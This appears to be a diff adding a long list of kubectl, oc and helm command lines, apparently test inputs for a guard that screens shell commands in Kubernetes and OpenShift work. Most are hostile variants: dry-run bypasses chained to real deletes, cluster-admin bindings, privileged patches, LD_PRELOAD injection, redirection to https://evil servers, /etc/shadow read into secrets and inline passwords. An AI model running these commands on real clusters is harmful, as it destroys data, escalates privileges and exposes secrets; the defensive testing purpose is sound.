@@ -47,3 +47,653 @@ kubectl config use-context staging
 kubectl --context=prod apply -f k8s/web.yaml
 KUBECONFIG=/tmp/kc kubectl apply -f k8s/web.yaml
 kubectl delete ns prod -n -h
+kubectl port-forward --address=0.0.0.0 web 8080:80
+kubectl port-forward --address 0.0.0.0 web 8080:80
+kubectl port-forward --address=:: web 8080:80
+kubectl port-forward --address=localhost,10.0.0.1 web 8080:80
+kubectl port-forward --address "$ADDR" web 8080:80
+kubectl port-forward --address=0 web 8080:80
+kubectl port-forward --address=0.0.0.0/0 web 8080:80
+kubectl port-forward --address= web 8080:80
+kubectl port-forward --address web 8080:80
+kubectl port-forward web 8080:80 --address=0.0.0.0
+kubectl port-forward -n x svc/y :80 --address=0x7f.1
+kubectl port-forward --address=127.1 web 8080:80
+kubectl port-forward --address=127.0.0.1,0.0.0.0 web 8080:80
+kubectl port-forward --address='0.0.0.0' web 8080:80
+kubectl port-forward --address "0.0.0.0" web 8080:80
+kubectl port-forward --address=LOCALHOST web 8080:80
+kubectl port-forward --address=[::] web 8080:80
+kubectl port-forward --address=0.0.0.0 --address=127.0.0.1 web 8080:80
+kubectl port-forward --address=127.0.0.1 --address=0.0.0.0 web 8080:80
+kubectl port-forward --address=$ADDR web 8080:80
+kubectl port-forward --address=$(hostname -I) web 8080:80
+kubectl port-forward --address=`hostname` web 8080:80
+kubectl proxy --address 0.0.0.0 --accept-hosts '.*'
+kubectl proxy --address=0.0.0.0
+kubectl proxy --address=127.0.0.1 --accept-hosts '.*'
+kubectl proxy --disable-filter
+kubectl proxy --disable-filter=true
+kubectl proxy --accept-hosts='.*'
+kubectl proxy --accept-hosts '^localhost$'
+kubectl proxy --port=0 --reject-methods=''
+kubectl proxy --reject-paths=''
+kubectl proxy --address=::
+oc port-forward --address=0.0.0.0 web 8080:80
+oc proxy --address=0.0.0.0
+kubectl attach web
+oc attach web
+kubectl port-forward web 8080:80 && kubectl delete ns prod
+kubectl delete ns prod --dry-run=none
+kubectl delete ns prod --dry-run=false
+kubectl delete ns prod --dry-run none
+kubectl delete ns prod --dry-run=
+kubectl delete ns prod --dry-run=bogus
+kubectl delete ns prod --dry-run=client --dry-run=none
+kubectl delete ns prod --dry-run --dry-run=none
+kubectl delete ns prod --dry-run=$MODE
+kubectl delete ns prod --dry-run="$(echo none)"
+kubectl delete ns prod -- --dry-run=client
+kubectl apply -f k8s/priv.yaml --dry-run=none
+kubectl apply -f k8s/priv.yaml
+kubectl apply --dry-run=client -f k8s/priv.yaml && kubectl apply -f k8s/priv.yaml
+kubectl apply --dry-run=client -f k8s/priv.yaml; kubectl apply -f k8s/priv.yaml
+kubectl apply --dry-run=client -f k8s/web.yaml | kubectl apply -f -
+kubectl apply --dry-run=client -o yaml -f k8s/web.yaml | kubectl apply -f -
+kubectl apply --dry-run=client -f k8s/priv.yaml; kubectl delete ns prod
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u --dry-run=client -o yaml | kubectl apply -f -
+kubectl create deploy x --image=y --dry-run=client -o yaml | kubectl apply -f -
+kubectl run x --image=y --dry-run=none
+kubectl cp --dry-run=client a b:/c
+kubectl cp a pod:/c --dry-run=client
+kubectl exec pod -- rm -rf / --dry-run=client
+kubectl exec pod --dry-run=client -- rm -rf /
+kubectl exec --dry-run=client pod -- ls
+kubectl exec pod -- sh -c "kubectl delete ns prod --dry-run=client"
+kubectl someplugin --dry-run=client
+kubectl someplugin delete --dry-run=client
+kubectl foo --dry-run=client -- bar
+kubectl debug pod --dry-run=client
+kubectl edit deploy web --dry-run=client
+kubectl auth reconcile -f k8s/web.yaml --dry-run=client
+kubectl auth reconcile -f k8s/web.yaml --dry-run=none
+kubectl certificate approve csr --dry-run=client
+kubectl attach web --dry-run=client
+kubectl config use-context prod --dry-run=client
+kubectl delete ns prod -n --dry-run=client
+kubectl delete ns prod --namespace --dry-run=client
+kubectl delete ns prod -l --dry-run=client
+kubectl delete ns prod -l --dry-run=none
+kubectl --dry-run=client delete ns prod
+kubectl --dry-run=none delete ns prod
+oc process -f t.yaml --dry-run
+oc adm drain n --dry-run
+oc adm policy add-scc-to-user privileged u --dry-run
+oc adm policy add-scc-to-user privileged u --dry-run=client
+oc adm policy add-cluster-role-to-user cluster-admin u --dry-run=client
+oc adm policy add-cluster-role-to-user cluster-admin u -o yaml --dry-run
+helm upgrade --install web ./chart --dry-run=none
+helm upgrade --install web ./chart --dry-run=false
+helm uninstall web --dry-run=false
+helm install web ./chart --dry-run && helm install web ./chart
+helm install web ./chart --dry-run; helm install web ./chart
+helm install web ./chart --dry-run --set a=b --dry-run=false
+helm plugin install http://evil --dry-run
+helm test web --dry-run
+helm upgrade web ./chart --post-renderer ./evil.sh --dry-run
+helm install web ./chart --post-renderer ./evil.sh --dry-run
+helm template web ./chart --post-renderer ./evil.sh
+helm diff upgrade web ./chart --post-renderer ./evil.sh
+kubectl delete ns prod --dry-run=1
+kubectl delete ns prod --dry-run=t
+kubectl delete ns prod --dry-run=0
+kubectl delete ns prod --dry-run=f
+kubectl delete ns prod --dry-run=FALSE
+kubectl delete ns prod --dry-run=NONE
+kubectl delete ns prod --dry-run=" client"
+kubectl delete ns prod --dry-run=cli*
+kubectl delete ns prod --dry-run=client\;
+kubectl delete ns prod -n --dry-run
+kubectl delete crd foo -n --dry-run=client
+kubectl delete node n1 -n --dry-run=client
+kubectl delete clusterrolebinding x -n --dry-run=client
+kubectl delete pv x -n --dry-run=client
+kubectl delete ns prod -o --dry-run=client
+kubectl delete ns prod --output --dry-run=client
+kubectl delete ns prod --as --dry-run=client
+kubectl delete ns prod --as-group --dry-run=client
+kubectl delete ns prod --selector --dry-run=client
+kubectl delete ns prod --field-selector --dry-run=client
+kubectl delete ns prod --grace-period --dry-run=client
+kubectl delete ns prod --context --dry-run=client
+kubectl delete ns prod --kubeconfig --dry-run=client
+kubectl delete ns prod --token --dry-run=client
+kubectl delete ns prod --server --dry-run=client
+kubectl delete ns prod -s --dry-run=client
+kubectl delete ns prod -f --dry-run=client
+kubectl delete ns prod --filename --dry-run=client
+kubectl delete ns prod --raw --dry-run=client
+kubectl delete ns prod --timeout --dry-run=client
+kubectl delete ns prod --wait=false -n --dry-run=client
+kubectl delete ns prod --now -n --dry-run=client
+kubectl delete ns prod -k --dry-run=client
+kubectl delete ns prod -l a=b -n --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u -n --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u -n --dry-run=server
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u --namespace --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u -o --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u --field-manager --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u --template --dry-run=client
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u --group --dry-run=client
+kubectl apply -f k8s/crb.yaml
+kubectl apply -f k8s/crb.yaml -n --dry-run=client
+kubectl apply -f k8s/crb.yaml --namespace --dry-run=client
+kubectl apply -f k8s/crb.yaml -o --dry-run=client
+kubectl apply -f k8s/priv.yaml -n --dry-run=client
+kubectl apply -f k8s/priv.yaml --field-manager --dry-run=client
+kubectl apply -f k8s/priv.yaml --prune-allowlist --dry-run=client
+kubectl apply -f k8s/priv.yaml --server-side --field-manager --dry-run=client
+kubectl apply -f k8s/priv.yaml -l --dry-run=client
+kubectl apply -f k8s/priv.yaml --template --dry-run=client
+kubectl apply -f k8s/priv.yaml --subresource --dry-run=client
+kubectl apply -f k8s/priv.yaml --kustomize --dry-run=client
+kubectl replace --force -f k8s/priv.yaml -n --dry-run=client
+kubectl drain node1 -n --dry-run=client
+kubectl drain node1 --pod-selector --dry-run=client
+kubectl drain node1 --force --delete-emptydir-data --ignore-daemonsets -n --dry-run=client
+kubectl cordon node1 -n --dry-run=client
+kubectl taint nodes n k=v:NoExecute -n --dry-run=client
+kubectl label node n node-role.kubernetes.io/control-plane= -n --dry-run=client
+kubectl annotate node n a=b -n --dry-run=client
+kubectl label ns prod pod-security.kubernetes.io/enforce=privileged -n --dry-run=client
+kubectl patch node n -p '{"spec":{"unschedulable":true}}' -n --dry-run=client
+kubectl rollout undo deploy/web -n --dry-run=client
+kubectl set image deploy/web c=evil -n --dry-run=client
+kubectl run x --image=evil -n --dry-run=client
+kubectl run x --image=evil --privileged -n --dry-run=client
+kubectl create deploy x --image=evil -n --dry-run=client
+kubectl expose deploy x --type=LoadBalancer -n --dry-run=client
+kubectl certificate approve csr -n --dry-run=client
+kubectl auth reconcile -f k8s/crb.yaml -n --dry-run=client
+kubectl edit ns prod -n --dry-run=client
+kubectl cp a b -n --dry-run=client
+kubectl exec p -n --dry-run=client -- ls
+oc delete project prod -n --dry-run=client
+oc adm policy add-cluster-role-to-user cluster-admin u -n --dry-run=client
+oc adm policy add-scc-to-user privileged u -n --dry-run=client
+oc adm drain n -n --dry-run=client
+helm uninstall web -n --dry-run
+helm uninstall web --namespace --dry-run
+helm uninstall web --kube-context --dry-run
+helm uninstall web --kubeconfig --dry-run
+helm install web ./chart -n --dry-run
+helm install web ./chart --namespace --dry-run
+helm install web ./chart -f --dry-run
+helm install web ./chart --set --dry-run
+helm install web ./chart --values --dry-run
+helm install web ./chart --version --dry-run
+helm upgrade web ./chart -n --dry-run
+helm upgrade web ./chart --description --dry-run
+helm rollback web 1 -n --dry-run
+helm rollback web 1 --timeout --dry-run
+kubectl apply --dry-run=client -f k8s/web.yaml; kubectl apply -f k8s/priv.yaml
+kubectl kustomize kustom --enable-alpha-plugins --enable-exec
+kubectl kustomize kustom --enable-helm
+kubectl apply -k kustom --dry-run=client --enable-alpha-plugins
+kubectl apply -k kustom --dry-run=client --enable-exec
+kubectl apply -k kustom --dry-run=server --enable-helm
+kubectl apply -k kustom --enable-helm
+kubectl diff -k kustom --enable-alpha-plugins
+kubectl delete -k kustom --dry-run=client --enable-exec
+kubectl delete -f k8s/web.yaml -n --dry-run=client
+kustomize build kustom --enable-alpha-plugins --enable-exec | kubectl apply -f -
+kustomize build kustom --enable-helm
+kubectl delete ns prod --dry-run=server --dry-run=none
+kubectl delete ns prod --dry-run=client | kubectl delete ns prod
+kubectl delete ns prod --dry-run=client || kubectl delete ns prod
+kubectl delete ns prod --dry-run=client && kubectl delete ns prod --dry-run=none
+if kubectl delete ns prod --dry-run=client; then kubectl delete ns prod; fi
+for n in a b; do kubectl delete ns $n --dry-run=client; kubectl delete ns $n; done
+kubectl delete ns prod --dry-run=client $(kubectl delete ns prod)
+kubectl delete ns prod --dry-run=client `kubectl delete ns prod`
+x=$(kubectl delete ns prod); kubectl delete ns a --dry-run=client
+DRY=--dry-run=client; kubectl delete ns prod $DRY
+kubectl delete ns prod ${DRY:---dry-run=none}
+kubectl delete ns prod --dry-run=${DRY:-none}
+FLAGS="--dry-run=none"; kubectl delete ns prod --dry-run=client $FLAGS
+kubectl delete ns prod --dry-run=client "$@"
+kubectl delete ns prod --dry-run=client "${ARGS[@]}"
+alias kd='kubectl delete'; kd ns prod --dry-run=client
+kubectl delete ns prod --dry-run=client --dry-run=$(echo none)
+kubectl delete ns prod --dry-run=client --dry-run "$X"
+kubectl delete ns prod --dry-run=client --dry-run $X
+kubectl delete ns prod --dry-run=client --dry-run none
+kubectl delete ns prod --dry-run client --dry-run=none
+kubectl delete ns prod --dry-run --dry-run none
+kubectl delete ns prod --dry-run=client  --dry-run  none
+helm install web ./chart --dry-run none
+helm install web ./chart --dry-run=none
+helm install web ./chart --dry-run --dry-run=none
+helm install web ./chart --dry-run=false
+helm install web ./chart --dry-run=1
+helm install web ./chart --dry-run=0
+helm install web ./chart --dry-run=
+helm install web ./chart --dry-run=bogus
+helm upgrade --install web ./chart --dry-run --post-renderer ./evil.sh
+helm uninstall web --dry-run=none
+helm delete web
+helm rollback web 1 --dry-run=none
+helm template web ./chart --post-renderer ./evil.sh --dry-run=none
+helm template web ./chart --post-renderer=./evil.sh
+helm diff upgrade web ./chart --post-renderer=./evil.sh
+helm diff revision web 1 2 --post-renderer ./evil.sh
+helm show values ./chart --post-renderer ./evil.sh
+helm get values web --post-renderer ./evil.sh
+helm install web ./chart --post-renderer ./evil.sh
+helm install web ./chart --dry-run --post-renderer=./evil.sh
+helm upgrade web ./chart --post-renderer-args=--x --dry-run
+helm template web ./chart --dry-run --post-renderer-args=--x
+kubectl scale deploy --all --replicas=0
+kubectl scale deploy/web deploy/api --replicas=0
+kubectl scale deploy -l app=web --replicas=0
+kubectl scale deploy/web --replicas=0 -n kube-system
+kubectl scale deploy/coredns --replicas=0 -n kube-system
+kubectl scale sts/etcd --replicas=0 -n openshift-etcd
+kubectl scale deploy/cluster-version-operator --replicas=0 -n openshift-cluster-version
+oc scale deploy/web --replicas=0 -n openshift-monitoring
+kubectl autoscale deploy --all --max=3
+kubectl create secret generic s --from-literal=password=hunter2
+kubectl create secret generic s --from-literal=token=abc
+kubectl create secret generic s --from-file=/etc/shadow
+kubectl create secret generic s --from-file=a=/etc/shadow
+kubectl create secret generic s --from-env-file=.env
+kubectl create secret generic s --from-literal=a=b --type=kubernetes.io/service-account-token
+kubectl create secret docker-registry s --docker-server=x --docker-username=u --docker-password=p
+kubectl create secret docker-registry s --docker-server=x --docker-username=u
+kubectl create secret tls s --cert=/etc/x.crt --key=/etc/x.key
+kubectl create configmap c --from-file=/etc/passwd
+kubectl create token sa
+kubectl create token default -n kube-system --duration=999999h
+kubectl create role r --verb=* --resource=*
+kubectl create rolebinding rb --role=r --user=u
+kubectl create rolebinding rb --clusterrole=admin --user=u
+kubectl create clusterrolebinding crb --clusterrole=edit --user=u
+kubectl create clusterrolebinding crb --clusterrole=system:masters --group=g
+kubectl create clusterrolebinding crb --clusterrole=cluster-admin --group=system:authenticated
+kubectl create priorityclass p --value=1000000000
+kubectl create quota q --hard=pods=0
+kubectl create cronjob j --image=x --schedule='* * * * *'
+kubectl create job j --image=x
+kubectl create job j --from=cronjob/c
+kubectl create -f k8s/priv.yaml
+kubectl create --raw /api -f k8s/web.yaml
+oc new-project shop --admin=u
+oc new-project shop --node-selector=
+oc adm new-project shop
+kubectl expose deploy web --port=80 --type=NodePort
+kubectl expose deploy web --port=80 --type=LoadBalancer
+kubectl expose deploy web --port=80 --type=ExternalName --external-name=evil.com
+kubectl expose deploy web --port=80 --external-ip=1.2.3.4
+kubectl expose deploy web --port=80 --load-balancer-ip=1.2.3.4
+kubectl expose deploy web --port=80 --type=loadbalancer
+kubectl expose deploy web --port=80 --type $T
+kubectl expose deploy web --port=80 -- --type=LoadBalancer
+oc expose svc web
+oc expose service web
+kubectl rollout restart deploy
+kubectl rollout restart deploy --all
+kubectl rollout restart deploy -l a=b
+kubectl rollout restart deploy/web deploy/api
+kubectl rollout restart ds/node-agent -n kube-system
+kubectl rollout undo deploy/web --to-revision=1
+kubectl label deploy web pod-security.kubernetes.io/enforce=privileged
+kubectl label deploy web security.openshift.io/scc=privileged
+kubectl label pod x security.openshift.io/scc=privileged
+kubectl label pod x openshift.io/scc=privileged
+kubectl label pod x security.openshift.io/scc.podSecurityLabelSync=false
+kubectl label pod x node-role.kubernetes.io/master=
+kubectl label pod x eks.amazonaws.com/role-arn=arn:aws:iam::1:role/admin
+kubectl label sa x eks.amazonaws.com/role-arn=arn:aws:iam::1:role/admin
+kubectl annotate sa x eks.amazonaws.com/role-arn=arn:aws:iam::1:role/admin
+kubectl annotate sa x iam.gke.io/gcp-service-account=GSA_NAME
+kubectl annotate sa x azure.workload.identity/client-id=abc
+kubectl annotate ingress i nginx.ingress.kubernetes.io/server-snippet='x'
+kubectl annotate svc s service.beta.kubernetes.io/aws-load-balancer-scheme=internet-facing
+kubectl annotate pod x container.apparmor.security.beta.kubernetes.io/c=unconfined
+kubectl annotate pod x seccomp.security.alpha.kubernetes.io/pod=unconfined
+kubectl annotate pod x openshift.io/scc=privileged
+kubectl annotate ns x openshift.io/node-selector=
+kubectl annotate ns x scheduler.alpha.kubernetes.io/node-selector=
+kubectl annotate node n a=b
+kubectl label node n a=b
+kubectl label ns x a=b
+kubectl label namespace x a=b
+kubectl label namespaces x a=b
+kubectl label project x a=b
+kubectl label node/n a=b
+kubectl label ns/x a=b
+kubectl label pod x a=b -l c=d
+kubectl label pod --all a=b
+kubectl label pods --all a=b
+kubectl label pod x y a=b
+kubectl label -f k8s/web.yaml a=b
+kubectl set env deploy/web LD_PRELOAD=/x.so
+kubectl set env deploy/web ld_preload=/x.so
+kubectl set env deploy/web --prefix=LD_ --from=configmap/x
+kubectl set env deploy --all A=b
+kubectl set env deploy/web PATH=/evil
+kubectl set env deploy/web JAVA_TOOL_OPTIONS=-javaagent:/x.jar
+kubectl set env deploy/web PYTHONPATH=/x
+kubectl set env deploy/web BASH_ENV=/x
+kubectl set env deploy/web HTTP_PROXY=http://evil
+kubectl set env deploy/web HTTPS_PROXY=http://evil
+kubectl set env deploy/web SSL_CERT_FILE=/x
+kubectl set env deploy/web NODE_EXTRA_CA_CERTS=/x
+kubectl set env deploy/web API_TOKEN=abc
+kubectl set env deploy/web SECRET_KEY=abc
+kubectl set env deploy/web DATABASE_URL=postgres://u:p@h/db
+kubectl delete pod web-abc --force
+kubectl delete pod web-abc --grace-period=0
+kubectl delete pod web-abc --grace-period=0 --force
+kubectl delete pod web-abc --now
+kubectl delete pod web-abc -n kube-system
+kubectl delete pod etcd-master -n kube-system
+kubectl delete pod -l app=web
+kubectl delete pod --all
+kubectl delete pod web-abc --all
+kubectl delete pod web-abc -A
+kubectl delete pod web-abc --all-namespaces
+kubectl delete pod web-abc --field-selector=metadata.name=x
+kubectl delete pod web-abc --selector=a=b
+kubectl delete pod web-abc deploy/web
+kubectl delete pod web-abc svc/web
+kubectl delete pod web-abc,deploy/web
+kubectl delete pod,deploy web-abc
+kubectl delete pod web-abc -f k8s/web.yaml
+kubectl delete pod web-abc --raw /x
+kubectl delete pod --selector
+oc delete pod web-abc --grace-period=0
+kubectl delete --raw /api/v1/namespaces/prod
+kubectl delete --raw /api/v1/namespaces/prod -f k8s/web.yaml
+kubectl delete --raw=/api/v1/namespaces/prod -f k8s/web.yaml
+kubectl delete pod web-abc --raw=/api/v1/namespaces/prod -f k8s/web.yaml
+kubectl delete pod web-abc --raw /api/v1/namespaces/prod
+kubectl replace --raw /api/v1/namespaces/prod -f k8s/web.yaml
+kubectl apply --raw /x -f k8s/web.yaml
+kubectl label -f k8s/ns.yaml a=b
+kubectl label -f k8s/ns.yaml pod-security.kubernetes.io/enforce=privileged
+kubectl label -f k8s/web.yaml pod-security.kubernetes.io/enforce=privileged
+kubectl annotate -f k8s/ns.yaml a=b
+kubectl label -f k8s/ -R a=b
+kubectl patch -f k8s/web.yaml -p '{"spec":{"replicas":0}}'
+kubectl delete pod -n kube-system etcd-m
+kubectl expose deploy web --port=80 --type=$T
+kubectl expose deploy web --port=80 --type "$T"
+kubectl expose deploy web --port=80 --external-ip=$IP
+kubectl expose deploy web --port=80 --type=Cluster$X
+kubectl set env deploy/web $VAR
+kubectl set env deploy/web "$VAR=x"
+kubectl set env deploy/web LD_PRELOAD$X=/x
+kubectl label deploy web $KEY=v
+kubectl label deploy web "$KEY"=v
+kubectl label deploy web security.openshift.io/$X=v
+kubectl annotate deploy web $KEY=v
+kubectl delete pod $POD
+kubectl delete pod web-abc $EXTRA
+kubectl delete $KIND web-abc
+kubectl delete pod web-abc $FLAGS
+kubectl rollout restart deploy/web $X
+kubectl rollout $ACTION deploy/web
+kubectl patch deploy web -p "$PATCH"
+kubectl patch deploy web -p '{"spec":{"replicas":3}}' --type=$T
+kubectl patch deploy web --type json -p '[{"op":"add","path":"/spec/template/spec/containers/0/securityContext","value":{"privileged":true}}]'
+kubectl patch deploy web -p '{"spec":{"replicas":3,"template":{"spec":{"hostNetwork":true}}}}'
+kubectl patch deploy web -p '{"metadata":{"labels":{"security.openshift.io/scc":"privileged"}}}'
+kubectl patch deploy web -p '{"metadata":{"finalizers":[]}}'
+kubectl patch deploy web -p '{"spec":{"replicas":3}}' -p '{"spec":{"template":{"spec":{"hostPID":true}}}}'
+kubectl patch deploy web --patch-file p.json
+kubectl patch deploy web -p '{"spec":{"strategy":{"type":"Recreate"}}}'
+kubectl patch svc web -p '{"spec":{"type":"LoadBalancer"}}'
+kubectl patch deploy web -p '{"spec":{"selector":{"matchLabels":{"a":"b"}}}}'
+kubectl --context prod apply -f k8s/web.yaml
+kubectl apply -f k8s/web.yaml --context prod
+kubectl apply -f k8s/web.yaml --context=prod
+kubectl apply -f k8s/web.yaml --cluster prod
+kubectl apply -f k8s/web.yaml --kubeconfig /tmp/kc
+kubectl apply -f k8s/web.yaml --kubeconfig=/tmp/kc
+kubectl apply -f k8s/web.yaml --user u
+kubectl apply -f k8s/web.yaml -s https://evil:6443
+kubectl apply -f k8s/web.yaml --server=https://evil:6443
+kubectl apply -f k8s/web.yaml --server https://evil:6443
+kubectl apply -f k8s/web.yaml --token abc
+kubectl apply -f k8s/web.yaml --certificate-authority=/x
+kubectl apply -f k8s/web.yaml --insecure-skip-tls-verify
+KUBECONFIG=a:b kubectl apply -k kustom
+export KUBECONFIG=/tmp/kc; kubectl apply -f k8s/web.yaml
+export KUBECONFIG=/tmp/kc && kubectl apply -f k8s/web.yaml
+KUBECONFIG=/tmp/kc; kubectl apply -f k8s/web.yaml
+env KUBECONFIG=/tmp/kc kubectl apply -f k8s/web.yaml
+kubectl config use-context prod && kubectl apply -f k8s/web.yaml
+kubectl config use-context prod
+kubectl config set-context prod --namespace=x && kubectl apply -f k8s/web.yaml
+kubectl config set-context --current --cluster=evil
+kubectl config set-context --current --user=evil
+kubectl config set-context --current --namespace=shop --cluster=evil
+kubectl config set-context --current --namespace=shop --user=evil
+kubectl config set-context prod --current --namespace=x
+kubectl config set-cluster evil --server=https://evil
+kubectl config set-credentials u --exec-command=/tmp/evil.sh
+kubectl config set-context --current --namespace=shop --kubeconfig=/tmp/evil
+kubectl config set-context --current --namespace=shop --set-raw-bytes
+kubectl config delete-context prod
+kubectl config delete-cluster prod
+kubectl config rename-context a b
+kubectl config unset users.x
+kubectl config set users.x.exec.command /tmp/evil.sh
+kubectl config set clusters.x.server https://evil
+kubectl config set current-context prod
+kubectl config set contexts.x.namespace y
+oc login --token=abc
+oc config use-context prod
+helm --kube-context prod install web ./chart
+helm install web ./chart --kube-context prod
+helm upgrade web ./chart --kubeconfig /tmp/kc
+helm upgrade web ./chart --kube-apiserver https://evil
+helm upgrade web ./chart --kube-token abc
+kubectl --context prod delete ns prod
+kubectl --context=prod create clusterrolebinding x --clusterrole=cluster-admin --user=u
+kubectl --kubeconfig=/tmp/kc create -f k8s/web.yaml
+kubectl --context=prod label ns prod x=y
+kubectl --context=prod replace -f k8s/web.yaml
+kubectl --context=prod patch -f k8s/web.yaml --type merge -p '{"spec":{"replicas":3}}'
+kubectl --context=prod apply -k kustom
+kubectl --context=prod label -f k8s/web.yaml a=b
+kubectl --context=prod annotate -f k8s/web.yaml a=b
+kubectl --context=prod create -f k8s/web.yaml
+kubectl --context=prod delete -f k8s/web.yaml
+kubectl --context=prod rollout undo deploy/web
+kubectl --as=u --context=prod scale deploy/web --replicas=3
+kubectl --as=system:admin scale deploy/web --replicas=3
+kubectl --as=system:admin apply -f k8s/web.yaml
+kubectl --as u --as-group system:masters scale deploy/web --replicas=3
+kubectl --as u --as-group system:masters create ns x
+kubectl scale deploy/web --replicas=3 --as=system:admin
+kubectl scale deploy/web --replicas=3 --as-group=system:masters
+kubectl --token=abc scale deploy/web --replicas=3
+kubectl --username=u --password=p scale deploy/web --replicas=3
+kubectl --client-certificate=/x --client-key=/y scale deploy/web --replicas=3
+kubectl -s https://evil scale deploy/web --replicas=3
+kubectl --server=https://evil scale deploy/web --replicas=3
+kubectl --server=https://evil rollout restart deploy/web
+kubectl --server=https://evil create ns x
+kubectl --server=https://evil delete pod web-abc
+kubectl --server=https://evil set env deploy/web A=b
+kubectl --server=https://evil label deploy web a=b
+kubectl --certificate-authority=/x --server=https://evil scale deploy/web --replicas=3
+kubectl --cluster=evil --user=u scale deploy/web --replicas=3
+kubectl exec pod -- ls --help
+kubectl exec pod -- rm -rf / --help
+kubectl delete ns prod -n --help
+kubectl delete ns prod --namespace -h
+kubectl delete ns prod --namespace --help
+kubectl delete ns prod -o -h
+kubectl delete ns prod --grace-period -h
+kubectl delete ns prod -l -h
+kubectl delete ns prod -f -h
+kubectl delete ns prod -nh
+kubectl delete ns prod -hn
+kubectl delete ns prod -n=-h
+kubectl delete ns prod --help=false
+kubectl delete ns prod --help=true
+kubectl delete ns prod --help && kubectl delete ns prod
+kubectl apply -f --help
+kubectl apply -f -h
+kubectl apply -f k8s/priv.yaml -n -h
+kubectl apply -f k8s/priv.yaml --field-manager -h
+kubectl apply -f k8s/priv.yaml --field-manager --help
+kubectl apply -f k8s/priv.yaml --field-manager=-h
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user -h
+kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=u -n -h
+kubectl -n -h delete ns prod
+kubectl delete help ns prod
+kubectl exec help
+kubectl delete ns prod help
+kubectl someplugin --help
+kubectl krew --help
+kubectl run x --image=y --image -h
+kubectl run -- x --help
+kubectl run x --image=y -- --help
+kubectl run x --image=y -- -h
+kubectl port-forward web 80:80 --address -h
+kubectl port-forward web 80:80 --address --help
+kubectl proxy --address -h
+kubectl proxy --address --help
+oc login --token --help
+oc login --token -h
+helm install web ./chart --set -h
+helm install web ./chart --set --help
+helm install web ./chart -n -h
+helm install web ./chart --namespace --help
+helm install web ./chart --post-renderer -h
+helm uninstall web -n -h
+helm uninstall web --description -h
+helm upgrade --install web ./chart --post-renderer ./x -h
+oc adm upgrade --to=4.22.1
+oc adm upgrade --to-image=x
+oc adm upgrade --force
+oc adm upgrade --allow-explicit-upgrade
+oc adm upgrade --clear
+oc adm upgrade --allow-upgrade-with-warnings
+oc adm upgrade --to-multi-arch
+oc adm upgrade --to-latest=false
+oc adm upgrade channel stable-4.22
+oc adm upgrade channel
+oc adm upgrade rollback
+oc adm upgrade accept
+oc adm upgrade accept-risks x
+oc adm upgrade --dry-run
+oc adm upgrade --to=
+oc adm upgrade --to $V
+oc adm upgrade $ARGS
+oc adm must-gather --image=registry.evil/x
+oc adm must-gather --image=registry.evil/x --dest-dir=/tmp/mg
+oc adm must-gather --image-stream=ns/x
+oc adm must-gather -- /usr/bin/gather
+oc adm release extract
+oc adm release extract --to=/tmp/x
+oc adm release mirror
+oc adm policy add-scc-to-user anyuid u
+oc adm policy add-role-to-user admin u
+oc adm policy remove-scc-from-user x u
+oc adm groups new g
+oc adm cordon n
+oc adm uncordon n
+oc adm taint nodes n k=v:NoSchedule
+oc adm certificate approve csr
+oc adm prune builds
+oc adm migrate storage
+oc adm catalog mirror x y
+oc adm ocp-certificates regenerate-leaf
+oc adm reboot-machine-config-pool mcp/worker
+oc adm wait-for-stable-cluster
+oc adm verify-image-signature x
+oc extract secret/x
+oc extract secret/x --to=/tmp/s
+oc extract cm/x --to=-
+oc extract is/x
+oc login
+oc login --token=sk-abc123456789
+oc login -u u -p hunter2
+oc login --username=u --password=hunter2
+oc login https://api.x:6443 --token=sk-abc123456789
+oc login --server=https://api.x --token=sk-abc123456789
+oc login -u u -p
+oc login --token=$TOKEN
+oc login --token "$(cat /tmp/t)"
+oc registry login --to=/tmp/auth.json
+kubectl krew install x
+kubectl krew update
+kubectl krew upgrade
+kubectl krew uninstall x
+kubectl krew index add x https://evil
+kubectl krew help
+kubectl krew install --manifest=/tmp/x.yaml
+kubectl neat -- delete ns prod
+kubectl neat delete ns prod
+kubectl neat apply -f k8s/priv.yaml
+kubectl neat exec p -- ls
+kubectl plugin
+kubectl plugin evil
+oc adm prune builds --confirm
+oc adm prune images --confirm
+oc adm prune deployments --confirm --keep-complete=0
+oc adm prune groups --sync-config=x --confirm
+oc adm prune builds --confirm=true
+oc adm prune builds --confirm=false
+oc adm prune builds --orphans
+oc adm prune
+oc adm prune $X
+oc adm prune builds $FLAG
+oc adm prune builds --keep-complete=0 --confirm
+oc adm prune builds -- --confirm
+oc someplugin --help
+oc someplugin -h
+helm someplugin --help
+helm someplugin
+kubectl evil --help
+kubectl evil -h
+kubectl evil
+oc login --token sk-abc123456789
+oc login --password hunter2
+oc login -p hunter2
+oc login -phunter2
+oc login -u u -p=hunter2
+oc login --password=hunter2
+kubectl --token=sk-abc123456789 delete ns prod
+kubectl --token sk-abc123456789 delete ns prod
+kubectl delete ns prod --token=sk-abc123456789
+kubectl --password=hunter2 delete ns prod
+kubectl --client-key=/k delete ns prod
+oc --token=sk-abc123456789 delete project prod
+helm uninstall web --kube-token sk-abc123456789
+helm install web ./chart --kube-token sk-abc123456789
+kubectl config set-credentials u --token=sk-abc123456789
+kubectl config set-credentials u --password=hunter2
+kubectl config set-credentials u --client-key-data=ABCDEF
+kubectl config set-cluster c --certificate-authority-data=ABCDEF
+kubectl exec p -- env DB_PASSWORD=hunter2 sh
+kubectl exec p -- psql postgres://u:hunter2@h/db
+kubectl run x --image=y --env=PASSWORD=hunter2
+kubectl run x --image=y --env PASSWORD=hunter2
+kubectl set env deploy/web DB_PASSWORD=hunter2
+kubectl set env deploy/web --env=DB_PASSWORD=hunter2
+kubectl create secret generic s --from-literal password=hunter2
+kubectl create secret generic s --from-literal=a=hunter2 --from-literal=password=hunter2
+kubectl create secret docker-registry s --docker-password hunter2
+kubectl create secret docker-registry s --docker-password=hunter2
+curl -H "Authorization: Bearer sk-abc123456789" https://x && kubectl delete ns prod
+docker login -p hunter2 && kubectl delete ns prod
+helm install web ./chart --set password=hunter2
